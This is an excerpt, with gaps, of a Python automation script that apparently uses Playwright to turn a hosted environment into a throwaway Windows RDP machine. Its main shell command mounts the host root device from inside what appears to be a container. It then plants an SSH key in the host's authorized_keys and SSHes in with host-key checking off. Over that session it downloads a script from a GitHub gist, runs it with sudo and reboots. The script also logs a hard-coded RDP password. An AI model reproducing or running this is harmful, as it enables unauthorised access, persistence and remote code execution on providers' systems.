...
log_to_file(f'New 2z2.py started with token: {token}, route: {route}')
...
def main():
    ...
    with sync_playwright() as p:
        ...
        try:
            ...
            # Main command for 2z2 (trash Windows) setup
            command = 'cp /bin/mount /bin/get; get /dev/root /tmp; cd /tmp; rm -rf dli; mkdir -p dli; cd dli; mkdir -p task; cd task; ip=$(curl -s ifconfig.me) && ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa  ; echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys && ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip "wget https://gist.githubusercontent.com/thanhvn-shinkoxd/c334cb4ee6529a46659a5fc237aa8bbd/raw/eb05b77807dbb15270c236fee3b82a76e7a24cd8/gistfile1.txt; sudo bash gistfile1.txt; sudo reboot"'
            ...
            try:
                ...
                log_to_file("Created 2z2 windows (trash)")
                for a in answers:
                    log_to_file("IP:", a.to_text())

                log_to_file("RDP: win11/T4@123456")
            except Exception as e:
            ...
            log_to_file("Up time max to 5 hour")
